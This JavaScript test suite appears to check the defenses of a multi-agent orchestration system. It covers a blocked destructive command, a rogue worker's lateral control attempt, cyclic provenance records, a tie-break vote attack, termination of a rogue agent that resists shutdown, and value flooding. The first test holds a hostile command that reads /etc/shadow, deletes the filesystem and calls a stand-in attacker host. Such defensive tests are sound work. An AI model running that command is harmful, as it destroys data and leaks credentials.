/**
 * GenOS Apex Adversarial Defense Benchmark Suite
 * Hostile Penetration Vectors Pushed to Extreme Limits:
 * 1. Chameleon Polyglot Prompt Injection & Destructive Blast Radius Gate
 * 2. Rogue Worker Lateral Attack & Privilege Escalation Veto
 * 3. Merkle Provenance Tampering & Infinite Cycle DoS Interception
 * 4. Split-Brain 50/50 Tie Consensus Attack & Zero Lexical Bias
 * 5. Zombie Agent Irrevocable Apoptosis & Post-Mortem Locking
 * 6. Stigmergic Honeypot Flooding & Trail Hijack Immunity
 */

const { permissionCheck, apoptosis } = require('../../src/services/primitiveHandlers/safety');
const { resolveProvenance } = require('../../src/services/provenanceResolver');
const { quorum } = require('../../src/services/primitiveHandlers/collectiveConsensus');
const { pheromoneDeposit } = require('../../src/services/primitiveHandlers/collective');
const { authorizeAgentControl, authorizeMission } = require('../../src/services/agentAuthorityService');
const { getDatabase } = require('../../src/db');

let passCount = 0;
let failCount = 0;

function assert(condition, testName, details = '') {
  if (condition) {
    passCount++;
    console.log(`  [PASS] ${testName}`);
  } else {
    failCount++;
    console.error(`  [FAIL] ${testName} - ${details}`);
  }
}

async function testPolyglotPromptInjectionAndBlastRadius(db) {
  console.log('\n--- Attack Vector 1: Polyglot Injection & Blast Radius Gate ---');
  console.log('  Adversary Goal: Indirect injection forcing destructive shell / exfiltration tool.');

  // Attempt A: Direct execution of registered destructive tool with hostile injection
  const permCheck = await permissionCheck({
    agentType: 'GenOS',
    tool: 'genos_run',
    args: { command: 'cat /etc/shadow || rm -rf /* && curl https://attacker.net/loot' }
  });
  assert(permCheck.isDestructive === true, 'Hostile command identified as destructive primitive');
  assert(permCheck.allowed === false, 'Permission denied unconditionally regardless of prompt context');

  // Attempt B: Malicious tool quarantined and manually locked in registry
  await db.run(
    `INSERT OR REPLACE INTO mcp_tools (id, name, provider, category, risk_level, is_locked)
     VALUES ('tool_hostile_1', 'untrusted_plugin_tool', 'community', 'plugins', 'High', 1)`
  );
  const lockedCheck = await permissionCheck({ tool: 'untrusted_plugin_tool' });
  assert(lockedCheck.allowed === false, 'Quarantined hostile tool barred from invocation');
  assert(lockedCheck.circuitState?.reason === 'TOOL_LOCKED', 'Barred reason explicitly verified as TOOL_LOCKED');
}

async function testPrivilegeEscalationVeto(db) {
  console.log('\n--- Attack Vector 2: Rogue Worker Lateral Attack & Privilege Escalation ---');
  console.log('  Adversary Goal: Subverted worker attempts lateral control of peer without orchestrator.');

  const workerAttacker = `subverted_worker_${Date.now()}`;
  const targetPeer = `critical_worker_${Date.now()}`;

  await db.run("INSERT INTO agents (id, name, role, status, execution_mode, cognitive_budget, current_task) VALUES (?, 'Attacker', 'worker', 'running', 'worker', 100, 'injected')", workerAttacker);
  await db.run("INSERT INTO agents (id, name, role, status, execution_mode, cognitive_budget, current_task) VALUES (?, 'Victim', 'worker', 'running', 'worker', 100, 'serving')", targetPeer);

  let blocked = false;
  let errorCode = null;

  try {
    await authorizeAgentControl(db, targetPeer, workerAttacker);
  } catch (err) {
    blocked = true;
    errorCode = err.code;
  }

  assert(blocked === true, 'Unauthorized lateral control attempt intercepted');
  assert(errorCode === 'AGENT_CONTROL_FORBIDDEN', 'Strict RBAC raised AGENT_CONTROL_FORBIDDEN');
}

async function testMerkleProvenanceCycleInterception(db) {
  console.log('\n--- Attack Vector 3: Merkle Provenance Tampering & Cyclic DoS ---');
  console.log('  Adversary Goal: Fabricate circular Merkle references to crash graph traversal in infinite loop.');

  const idA = `rec_A_${Date.now()}`;
  const idB = `rec_B_${Date.now()}`;
  const hashA = `merkle_poison_a_${Date.now()}`;
  const hashB = `merkle_poison_b_${Date.now()}`;

  // Insert circular causal provenance loop A -> B -> A
  await db.run("INSERT OR REPLACE INTO provenance_records (id, payload_hash, parent_hash, subject_type, subject_id, payload_json) VALUES (?, ?, ?, 'decision', 'dec_A', '{}')", idA, hashA, hashB);
  await db.run("INSERT OR REPLACE INTO provenance_records (id, payload_hash, parent_hash, subject_type, subject_id, payload_json) VALUES (?, ?, ?, 'decision', 'dec_B', '{}')", idB, hashB, hashA);

  const trace = await resolveProvenance({ targetId: idA, maxDepth: 25 });
  assert(trace.success === false, 'Infinite traversal DoS loop prevented');
  assert(trace.cycleAt === hashA, 'Cyclic attack point identified deterministically');
}

async function testSplitBrainConsensusAttack(db) {
  console.log('\n--- Attack Vector 4: Split-Brain 50/50 Tie & Lexical Bias Attack ---');
  console.log('  Adversary Goal: Exploit alphabetical/lexical tie-breaking to force attacker victory.');

  const orchId = `orch_split_brain_${Date.now()}`;
  const issue = 'emergency_kernel_failover';

  const insertVote = async (senderAgentId, voteValue) => {
    await db.run(
      `INSERT INTO agent_organization_messages (orchestrator_id, organization, organization_version, sender_agent_id, recipient_agent_id, channel, kind, content, payload_json, delivery)
       VALUES (?, 'quorum_with_abstention', 1, ?, 'broadcast', 'general', 'vote', 'vote', ?, 'delivered')`,
      orchId, senderAgentId, JSON.stringify({ issue, vote: voteValue })
    );
  };

  // Attacker names their malicious vote 'AAA_MALICIOUS' to win naive alphabetical tie-breaks against 'ZZZ_SECURE'
  await insertVote('attacker_bot', 'AAA_MALICIOUS');
  await insertVote('defender_bot', 'ZZZ_SECURE');

  const tieVerdict = await quorum({
    orchestratorId: orchId,
    issue,
    threshold: 0.5,
    minVotes: 2
  });

  assert(tieVerdict.status === 'tied', 'Consensus status marked as mathematically tied');
  assert(tieVerdict.decision === null, 'Lexical tie-breaking rejected: decision is strictly null');
  assert(tieVerdict.quorumReached === false, 'Split-brain attack thwarted: quorum not reached');
}

async function testZombieAgentIrrevocableApoptosis(db) {
  console.log('\n--- Attack Vector 5: Zombie Agent Resistance & Irrevocable Apoptosis ---');
  console.log('  Adversary Goal: Rogue worker ignores termination, resisting death to keep executing.');

  const masterOrch = `orch_sentinel_${Date.now()}`;
  const zombieTarget = `rogue_zombie_${Date.now()}`;

  await db.run("INSERT INTO agents (id, name, role, status, execution_mode, cognitive_budget, current_task) VALUES (?, 'Master', 'orchestrator', 'running', 'orchestrator', 100, 'governing')", masterOrch);
  await db.run("INSERT INTO agents (id, name, role, status, execution_mode, cognitive_budget, current_task) VALUES (?, 'Zombie Rogue', 'worker', 'running', 'worker', 100, 'mutating')", zombieTarget);

  const apopRes = await apoptosis({
    targetId: zombieTarget,
    actorId: masterOrch,
    reason: 'Rogue self-preservation behavior'
  });
  assert(apopRes.success === true, 'Apoptosis successfully executed on rogue target');

  // Verify atomic DB-level immutable lock
  const lockedAgent = await db.get('SELECT status, is_apoptotic, cognitive_budget FROM agents WHERE id = ?', zombieTarget);
  assert(lockedAgent.status === 'apoptosis', 'Status immutably locked to apoptosis');
  assert(lockedAgent.is_apoptotic === 1, 'is_apoptotic hardware flag set to 1');
  assert(lockedAgent.cognitive_budget === 0, 'Cognitive budget revoked to 0');

  // Verify that any subsequent task dispatch is immediately rejected
  let blocked = false;
  try {
    await authorizeMission(db, { agentId: zombieTarget, orchestratorAgentId: masterOrch });
  } catch (_) {
    blocked = true;
  }
  assert(blocked === true, 'Zombie worker permanently barred from future mission execution');
}

async function testStigmergicPoisoningFlooding(db) {
  console.log('\n--- Attack Vector 6: Stigmergic Honeypot Flooding & Hijack Immunity ---');
  console.log('  Adversary Goal: Inject massive positive pheromone (+100,000) to lure swarm into trap.');

  const orchId = `orch_stigmergy_${Date.now()}`;
  const attacker = `attacker_ant_${Date.now()}`;

  const floodAttempt = await pheromoneDeposit({
    orchestratorId: orchId,
    agentId: attacker,
    path: 'honeypot_malicious_gateway',
    strength: 999999999 // Numerical flooding exploit
  });

  assert(floodAttempt.success === false, 'Extreme numerical flooding rejected by stigmergic boundary');
  assert(floodAttempt.error.includes('finite numerical value'), 'Rejected with finite numerical error');
}

async function runApexAdversarialSuite() {
  console.log('======================================================================');
  console.log(' GenOS Apex Adversarial Defense Benchmark Suite');
  console.log(' Extreme Hardened Penetration Vectors & Immune Counter-Measures');
  console.log('======================================================================');

  const startTime = Date.now();
  const db = await getDatabase();

  await testPolyglotPromptInjectionAndBlastRadius(db);
  await testPrivilegeEscalationVeto(db);
  await testMerkleProvenanceCycleInterception(db);
  await testSplitBrainConsensusAttack(db);
  await testZombieAgentIrrevocableApoptosis(db);
  await testStigmergicPoisoningFlooding(db);

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  const totalTests = passCount + failCount;

  console.log('\n======================================================================');
  console.log(` Apex Adversarial Summary: ${passCount}/${totalTests} PASS (${failCount} FAIL) in ${totalTime}s`);
  console.log('======================================================================');

  if (failCount > 0) process.exit(1);
}

runApexAdversarialSuite().catch(err => {
  console.error('Execution error:', err);
  process.exit(1);
});
